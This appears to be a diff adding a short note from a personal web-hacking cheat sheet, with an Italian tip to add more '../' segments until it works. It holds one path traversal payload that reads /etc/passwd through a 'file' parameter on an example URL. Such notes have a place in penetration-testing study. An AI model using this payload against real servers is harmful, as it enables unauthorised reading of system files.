@@ -1,0 +1,3 @@
+http://example.com/my_app/display.php?file=../../../../etc/passwd
+
+provare più /../ possibile ( se non funziona aggiungere altri)
